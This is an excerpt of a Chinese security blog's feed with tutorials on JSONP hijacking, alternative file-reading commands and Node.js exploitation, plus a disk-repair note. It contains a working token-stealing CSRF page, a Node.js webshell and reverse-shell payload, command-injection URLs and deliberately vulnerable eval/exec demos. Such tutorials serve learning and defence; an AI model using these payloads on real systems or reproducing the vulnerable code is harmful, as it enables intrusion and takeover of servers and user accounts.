class="comment">//json.json</span></span><br><span class="line"><span class="function"><span class="title">callback</span><span class="params">(&#123; username: <span class="string">"boogle"</span>, password: <span class="string">"zhengbao.wang"</span> &#125;)</span></span></span><br></pre></td></tr></table></figure><p>成功实现跨域资源访问</p><p><img src="https://i.loli.net/2019/08/15/zaoPSOhkXfigsF2.png" alt></p><h2 id="0x04-jsonp劫持漏洞"><a href="#0x04-jsonp劫持漏洞" class="headerlink" title="0x04  jsonp劫持漏洞"></a>0x04  jsonp劫持漏洞</h2><p>说到现在，<code>jsonp</code>在实现跨域资源访问这方面确实是一种不错的选择，可以说是广大程序员们智慧的结晶，但是任何事物都有两面性，<code>jsonp</code>也不例外。如果通过一些敏感的数据通过这种方式去传输，便很容易造成信息泄露，但这并不是<code>jsonp</code>引起的，因为即使使用<code>json</code>格式，去传输上面的类似的账号密码信息，攻击者一样可以通过直接访问获取到敏感数据。但是，因为<code>jsonp</code>实现了跨域资源访问，如果获取的数据能够成为下一步操作的凭证，那么便可以引起<code>csrf</code>，即jsonp劫持。</p><p>比如说，一个用户发表文章的操作，需要验证<code>token</code>防止csrf，而这个<code>token</code>的获取，确是通过jsonp这种方式，那么攻击者便可以在自己的网页实现跨域获取token，并让这个用户发表文章。此时只要用户点击这个页面，便会神不知鬼不觉的发表一篇文章，如果发表的文章中带有这个恶意页面链接，那么所有点击的人都会发送这样一篇文章，从而实现csrf蠕虫。而且由于<code>jsonp</code>跨域的操作，使得原本可以预防csrf的token形同虚设。</p><p>在乌云上一搜，可以看到许多大厂都有过jsonp劫持的案例</p><p><img src="https://i.loli.net/2019/08/15/dGpizMBUQIvFegE.png" alt></p><p>这里简单写一个演示demo去理解，为了方便，代码中涉及到的token等都被写死了。</p><p>模拟一个发表文章页面,只有在token正确的情况下才会发表，避免了csrf。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'token'</span>]))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$csrf_token = $_POST[<span class="string">'token'</span>];</span><br><span class="line">$title = $_POST[<span class="string">'title'</span>];</span><br><span class="line">$content = $_POST[<span class="string">'content'</span>];</span><br><span class="line"><span class="keyword">if</span> ($csrf_token === <span class="string">'NKJJDkajwdadwdad_csrf_token_test'</span>)</span><br><span class="line">&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">'文章发表成功~'</span>.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $title.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'csrf token error'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'no token'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>跟之前一样，token被保存在<code>json.json</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callback(&#123;"username":"boogle","password":"zhengbao.wang","token":"NKJJDkajwdadwdad_csrf_token_test"&#125;)</span><br></pre></td></tr></table></figure><p>现在模拟黑客，写一个页面诱导用户点击</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//hello.html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.111.132/add.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">id</span>=<span class="string">"csrfsend"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"content"</span> <span class="attr">value</span>=<span class="string">"I can control you"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"title"</span> <span class="attr">value</span>=<span class="string">"hello,jsonp"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">id</span>=<span class="string">"token"</span> <span class="attr">name</span>=<span class="string">"token"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">callback</span><span class="params">(obj)</span></span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(obj);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> token = obj[<span class="string">"token"</span>];</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">"token"</span>).value = token;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">"csrfsend"</span>).submit();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://192.168.111.132/json.json"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时攻击者将页面存放在自己的服务器<code>http://192.168.111.1/hello.html</code>，并诱导用户点击。</p><p>可以看到，token被获取到并成功验证，发表了一篇文章。</p><p><img src="https://i.loli.net/2019/08/15/3kVIBC7QKEDjiGt.png" alt></p><h2 id="0x05-漏洞挖掘思路"><a href="#0x05-漏洞挖掘思路" class="headerlink" title="0x05 漏洞挖掘思路"></a>0x05 漏洞挖掘思路</h2><p>jsonp劫持漏洞的挖掘，可以借助于搜索引擎，使用<code>Google Hacking</code>语法针对目标站点进行关键词搜索。</p><p>比如</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">site</span><span class="selector-pseudo">:zhengbao.wang</span> <span class="selector-tag">inurl</span><span class="selector-pseudo">:callback</span></span><br></pre></td></tr></table></figure><p>常见的关键词有</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">callback</span><br><span class="line">jsoncallback</span><br><span class="line">jsonpcallback</span><br><span class="line">jsoncall</span><br><span class="line">jsonpcall</span><br><span class="line">cb</span><br><span class="line">jsoncb</span><br><span class="line">jsonpcb</span><br><span class="line">=json</span><br><span class="line">=jsonp</span><br><span class="line">=jQuery</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/16/ShjO7XpFvMITCqg.png" alt></p><p>此外，还可以在对目标站点浏览器时，打开<code>F12</code>开发者工具，点击<code>network</code>窗口并勾选<code>preserve log</code>，查看请求记录并进行关键词筛选。</p><p><img src="https://i.loli.net/2019/08/16/waoxu6ky5DrPA7B.png" alt></p><p>筛选的依据同样可以从上面的关键词中挑选</p><p><img src="C:\Users\14737\AppData\Roaming\Typora\typora-user-images\1565928444151.png" alt="1565928444151"></p><p>查找到后需要进行确认，判断其是否是真的jsonp方法，可通过跨域浏览实现，将前面的<code>get_jsonp.html</code>进行修改，<code>&lt;script&gt;</code>标签内的<code>src</code>改为目标url，将<code>callback</code>等关键词后面的回调函数名改为我们定义的函数名称。修改完后，放在我们的站点继续访问</p><p><img src="https://i.loli.net/2019/08/16/6osenB8M1NX9QFL.png" alt></p><p>能够获取到数据即可确定</p><p><img src="https://i.loli.net/2019/08/16/uF7nXC1gIml62aj.png" alt></p><p>当然，并不是所有的数据都是有用的，应重点关注一些敏感信息泄露及<code>csrf token</code>等，便于后续利用。</p><h2 id="0x06-后记"><a href="#0x06-后记" class="headerlink" title="0x06 后记"></a>0x06 后记</h2><p>文中所提到的demo，为了简单，都已经写死了，但是真正的jsonp在使用起来可以变得更加复杂，包括可以获取动态的token值，可以使用动态的callback函数等，本文旨在对jsonp即jsonp劫持漏洞的扫盲，更多的操作可查阅详细的资料。</p><p>参考文章：</p><p><a href="https://m.php.cn/article/394158.html" target="_blank" rel="noopener">https://m.php.cn/article/394158.html</a></p><p><a href="https://m.php.cn/article/394158.html" target="_blank" rel="noopener">https://www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;jsonp在跨域资源共享方面已存在了好多年，jsonp劫持技术也已被大佬们用烂了，本篇文章从介绍什么
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="jsonp" scheme="https://zhengbao.wang/tags/jsonp/"/>
    
  </entry>
  
  <entry>
    <title>花式文件内容读取</title>
    <link href="https://zhengbao.wang/%E8%8A%B1%E5%BC%8F%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E8%AF%BB%E5%8F%96/"/>
    <id>https://zhengbao.wang/花式文件内容读取/</id>
    <published>2019-08-07T08:29:10.000Z</published>
    <updated>2019-08-08T01:14:00.837Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>今天在客户机器上测试时发现<code>cat</code>命令被禁了，由此想到还有哪些命令可以用于读取文件内容。网上一搜，果然发现不少，特此记录一下。</p><p><img src="https://i.loli.net/2019/08/07/8XZ1yEBzHKsrVR2.png" alt></p><h2 id="0x01-常用文件内容读取命令"><a href="#0x01-常用文件内容读取命令" class="headerlink" title="0x01 常用文件内容读取命令"></a>0x01 常用文件内容读取命令</h2><p>按正常来说，常用的几个文件读取命令有<code>cat</code> <code>head</code> <code>more</code> <code>less</code> <code>nl</code> <code>tail</code> <code>tailf</code> <code>tac</code></p><p>其中<code>tailf</code> 用于读取文件最后10行内容，一般用于读取最新的日志文件，也可以使用<code>-n</code>参数改变读取的行数。但这个命令在一些linux系统中并没有在装机时安装。</p><p>另外<code>tac</code> 命令跟<code>cat</code>相反，用于按行倒着输出文件内容。</p><p><img src="https://i.loli.net/2019/08/07/m3rqLBTPXZ4hSsw.png" alt></p><p>此外，less命令用于分页显示，如果在远程命令执行漏洞环境下可能读取的内容并不能直接返回，此时可以<code>echo `less flag.txt`</code>  或者   <code>less flag.txt |grep &#39;&#39;</code></p><p><img src="https://i.loli.net/2019/08/07/4skPlFJb3GugNxw.png" alt></p><p>除了直接读取外，一些内容编辑软件也可以用来读取文件内容，例如<code>vi</code> <code>vim</code></p><h2 id="0x02-花式文件内容读取命令"><a href="#0x02-花式文件内容读取命令" class="headerlink" title="0x02 花式文件内容读取命令"></a>0x02 花式文件内容读取命令</h2><p>除了常用的文件内容读取命令外，在搜索过程中发现了大佬们总结的其他花式文件内容读取命令:<a href="https://xz.aliyun.com/t/2281" target="_blank" rel="noopener">https://xz.aliyun.com/t/2281</a></p><ul><li>static-sh</li></ul><p><img src="https://i.loli.net/2019/08/07/8DSaTsUydR9c5i1.png" alt></p><ul><li>paste</li></ul><p><img src="https://i.loli.net/2019/08/07/eLJrGKUTZS14Oi5.png" alt></p><ul><li>diff</li></ul><p>diff命令用来比较两个文件的不同，所以后面应该跟两个参数</p><p><img src="https://i.loli.net/2019/08/07/uJwS6qtFiGlQoa7.png" alt></p><ul><li><p>od</p><p>od命令以8进制字码输出文件内容，可使用<code>-a</code>参数辅助查看输出内容</p></li></ul><p><img src="https://i.loli.net/2019/08/07/zxh6BDfgUmRecid.png" alt></p><ul><li>bzmore</li></ul><p><img src="https://i.loli.net/2019/08/07/WEzZkxXRLT5Fj76.png" alt></p><ul><li><p>bzless</p><p><img src="https://i.loli.net/2019/08/07/3ZF7uQ1fURC9yPN.png" alt></p></li></ul><h2 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h2><p>花式文件内容读取可能在平时并不会用到，但是在实际渗透过程中，如果环境中常用的文件读取命令被禁用，此时花式文件内容读取不失为一种优美的绕过姿势。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;今天在客户机器上测试时发现&lt;code&gt;cat&lt;/code&gt;命令被禁了，由此想到还有哪些命令可以用于读
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="bypass" scheme="https://zhengbao.wang/tags/bypass/"/>
    
      <category term="文件读取" scheme="https://zhengbao.wang/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>Nodejs安全</title>
    <link href="https://zhengbao.wang/Nodejs%E5%AE%89%E5%85%A8/"/>
    <id>https://zhengbao.wang/Nodejs安全/</id>
    <published>2019-08-07T06:53:18.000Z</published>
    <updated>2019-08-07T08:38:22.391Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。Node 是一个让 JavaScript 运行在服务端的开发平台，它让 JavaScript 成为与PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言。因为在之前并没有了解过nodejs的所产生的安全问题，本文将以node.js框架<code>express</code>为例，浅析nodejs安全问题。</p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>本次测试使用express框架，环境搭建很简单，只需新建一个工作目录，然后执行<code>npm install expres –save</code>,即可使用<code>express</code>。<br>演示代码如下<code>test.js</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> resp=<span class="built_in">eval</span>(<span class="string">"("</span>+req.query.input+<span class="string">")"</span>);</span><br><span class="line"> res.send(<span class="string">'Output&lt;/br&gt;'</span>+resp);</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(<span class="number">8001</span>);</span><br></pre></td></tr></table></figure></p><p>然后执行<code>node test.js</code>即可在本地<code>8001</code>端口启动一个简单的web应用程序。<br><img src="https://i.loli.net/2019/07/12/5d2882fb3610d56344.png" alt></p><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><p>在渗透测试过程种，对目标的渗透必要要经过信息收集以获取更过的信息来定制下一步的行动计划。对Node.js应用的渗透也要经过信息收集，以确定目标是否使用了Node.js。收集过程中重点留意cookies， name[“connect.sid”]，server以及 X-powered-By 等头信息。如在前面搭建起的环境种，<code>X-powered-By</code>头暴露了目标使用<code>express</code>框架。<br><img src="https://i.loli.net/2019/07/12/5d28846f8727a76819.png" alt><br>此外，程序运行时意外的报错信息也能帮助获取更多的信息，当然，一个大型的项目很少会出现这种报错。<br>但在上面的demo中，输入的input中带有一些特殊字符时将触发报错。<br><img src="https://i.loli.net/2019/07/12/5d28865b486e137355.png" alt><br>在得知目标为<code>Node.js</code>应用后，便可以进行进一步的利用。</p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><h3 id="服务端代码执行"><a href="#服务端代码执行" class="headerlink" title="服务端代码执行"></a>服务端代码执行</h3><p>在前面的demo中，通过get传入的参数未经任何过滤而直接进入到<code>eval()</code>函数中执行，此处便存在代码执行漏洞。<br>下面是可以用于测试的一些payload</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">process</span>.arch</span><br><span class="line"><span class="built_in">process</span>.argv</span><br><span class="line"><span class="built_in">process</span>.argv0</span><br><span class="line"><span class="built_in">process</span>.channel</span><br><span class="line"><span class="built_in">process</span>.cwd()</span><br><span class="line"><span class="built_in">process</span>.geteuid()</span><br><span class="line"><span class="built_in">process</span>.getegid()</span><br><span class="line"><span class="built_in">process</span>.pid</span><br><span class="line"><span class="built_in">process</span>.<span class="built_in">platform</span></span><br><span class="line"><span class="built_in">process</span>.<span class="built_in">version</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/12/5d2888947cf8370728.png" alt><br>甚至可以传入<code>process.exit()</code>终止程序的运行。<br><img src="https://i.loli.net/2019/07/12/5d28894f0822b82705.png" alt></p><p>读取文件<code>require(&#39;fs&#39;).readFileSync(&#39;test.js&#39;).toString()</code><br><img src="https://i.loli.net/2019/07/12/5d2889c16bdee95884.png" alt></p><p>获取webshell<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123; <span class="built_in">require</span>(<span class="string">'http'</span>).createServer(<span class="function"><span class="keyword">function</span> <span class="params">(req, res)</span></span> &#123; res.writeHead(<span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/plain"</span>&#125;);<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="built_in">require</span>(<span class="string">'url'</span>).parse(req.url, <span class="literal">true</span>).query[<span class="string">'cmd'</span>], <span class="function"><span class="keyword">function</span><span class="params">(e,s,st)</span></span> &#123;res.<span class="keyword">end</span>(s);&#125;); &#125;).listen(<span class="number">8003</span>); &#125;, <span class="number">3000</span>)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/07/16/5d2d2ea8632f956229.png" alt><br>这里传入<code>setTimeout</code>函数，三秒后在8003端口启动一个webshell。(延时时间最好大于1s，否则可能执行失败)<br><img src="https://i.loli.net/2019/07/16/5d2d2e91221c876341.png" alt><br>成功执行命令，可以看到<code>setTimeout</code>也可以执行任意代码，所以会任何进入系统函数的用户输入都是不安全的，在测试过程不仅要注意<code>eval</code>函数，还要注意<code>setTimeuut</code> <code>setInterval</code>等系统函数。</p><p>获取反弹shell<br>payload<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rev</span>(<span class="params">host,port</span>)</span>&#123;<span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);<span class="keyword">var</span> cp  = <span class="built_in">require</span>(<span class="string">'child_process'</span>);<span class="keyword">var</span> cmd = cp.spawn(<span class="string">'cmd.exe'</span>, []);<span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();client.connect(port, host, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;client.write(<span class="string">'Connected\r\n'</span>); client.pipe(cmd.stdin); cmd.stdout.pipe(client);cmd.stderr.pipe(client);client.on(<span class="string">'exit'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">code,signal</span>)</span>&#123; client.end(<span class="string">'Disconnected\r\n'</span>); &#125; );client.on( <span class="string">'error'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123; setTimeout( rev(host,port), <span class="number">5000</span>); &#125;)&#125;);&#125;;rev(<span class="string">'127.0.0.1'</span>, <span class="number">1234</span>);</span><br></pre></td></tr></table></figure></p><p>这里也可使用<a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py" target="_blank" rel="noopener">nodejsshell.py</a>生成编码后的nodejs代码<br>输入监听的ip 端口<br><img src="https://i.loli.net/2019/07/16/5d2d38593d54c25929.png" alt><br>执行生成的payload<br><img src="https://i.loli.net/2019/07/16/5d2d38a07e94893643.png" alt><br>nc成功监听到返回的shell<br><img src="https://i.loli.net/2019/07/16/5d2d38dc0856c30683.png" alt><br>目标为Linux主机可以返回<code>/bin/bash</code>,windows下可以返回<code>cmd.exe</code>，可以在生成代码的第36行进行修改<br><img src="https://i.loli.net/2019/07/16/5d2d39482974b24029.png" alt></p><h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><p><code>Node.js</code>的远程命令执行主要是由于没有正确使用<code>child_process</code>模块造成的，该模块可以创建一个新的进程进来执行系统命令。<br><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="built_in">url</span> = <span class="built_in">require</span>(<span class="string">"url"</span>);</span><br><span class="line"><span class="keyword">var</span> exe = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> parsedUrl = <span class="built_in">url</span>.parse(request.url, <span class="literal">true</span>);</span><br><span class="line">  response.writeHead(<span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/html"</span>&#125;);</span><br><span class="line">  exe.exec(<span class="string">'ping -c 2 '</span> + parsedUrl.query.ping, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">  response.write(<span class="string">"Hello "</span>+ data);</span><br><span class="line">  response.end();</span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line">&#125;).listen(<span class="number">8888</span>);</span><br></pre></td></tr></table></figure></p><p>上面的demo中使用了<code>child_process</code>模块的exec函数来进行系统交互来执行<code>ping</code>命令。但是由于没有正确过滤传入的参数，从而造成任意系统命令执行。<br>正常服务<br><img src="https://i.loli.net/2019/08/07/9Py6NVuzFOjYB5l.png" alt><br>执行任意命令<br><code>http://127.0.0.1:8888/?ping=www.baidu.com;||dir</code><br><img src="https://i.loli.net/2019/08/07/ygQtSMiX3JIWldn.png" alt></p><h3 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h3><p>这是<code>Node.js</code>一个比较独特的特性，允许一个参数有多个值传入，当对一个参数传入多个值时，中间会以逗号<code>,</code>进行拼接。<br>比如上面的demo中，我们传入两个ping值<br><img src="https://i.loli.net/2019/08/07/yxjezVQbuZApCcK.png" alt><br>这个特性可能会引起参数解析漏洞或者在绕过waf时提供思路。</p><h2 id="0x04-防护"><a href="#0x04-防护" class="headerlink" title="0x04 防护"></a>0x04 防护</h2><p>在给出的<code>Node.js</code>不安全的demo中，可以明显的看出，同其他语言一样，所有未加过滤的用输入都是不安全的，所以在开发过程中应时刻注意对用户输入做适当的处理，令附node.js安全开发的一些参考<a href="https://www.cnblogs.com/qingmingsang/articles/10397870.html" target="_blank" rel="noopener">https://www.cnblogs.com/qingmingsang/articles/10397870.html</a></p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://bbs.ichunqiu.com/thread-24807-1-1.html?from=beef" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-24807-1-1.html</a><br><a href="https://www.jianshu.com/p/8253adac33d8" target="_blank" rel="noopener">https://www.jianshu.com/p/8253adac33d8</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。Node 是
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Nodejs" scheme="https://zhengbao.wang/tags/Nodejs/"/>
    
  </entry>
  
  <entry>
    <title>Linux run fsck failed问题解决办法</title>
    <link href="https://zhengbao.wang/Linux-run-fsck-failed%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    <id>https://zhengbao.wang/Linux-run-fsck-failed问题解决办法/</id>
    <published>2019-06-19T13:47:43.000Z</published>
    <updated>2019-06-19T13:49:44.908Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前课程设计内容保存在reahat虚拟机里了，最近要进行答辩，打开虚拟机一看竟然启动失败。<br>心咯噔一下，仔细看一下幸好不是大问题，仅此小记，以备不时之需。</p><h2 id="0x01-问题"><a href="#0x01-问题" class="headerlink" title="0x01 问题"></a>0x01 问题</h2><p><img src="https://i.loli.net/2019/06/19/5d0a3afe4241917700.png" alt><br>从截图中可以看到启动失败的问题为<code>RUN fsck manuplly failed</code><br>看样子应该是硬盘出现了啥问题，导致开启时分区挂载不上，然后修复失败。</p><p>好在下面给了个手动修复的命令行，只要输入<code>root password</code>即可登陆</p><h2 id="0x02-解决"><a href="#0x02-解决" class="headerlink" title="0x02 解决"></a>0x02 解决</h2><p>既然时自动修复失败，那么便手动修复一下试试。<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fsck -y <span class="regexp">/dev/m</span>apper<span class="regexp">/VolGroup-lv_root</span></span><br></pre></td></tr></table></figure></p><p>这里<code>/dev/mapper/VolGroup-lv_root</code>修复路径为上面修复失败的路径<br>修复后如下图，<code>reboot</code>重启应该就没啥问题了。<br><img src="https://i.loli.net/2019/06/19/5d0a3c43ebfdb22919.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;之前课程设计内容保存在reahat虚拟机里了，最近要进行答辩，打开虚拟机一看竟然启动失败。&lt;br&gt;心
      
    
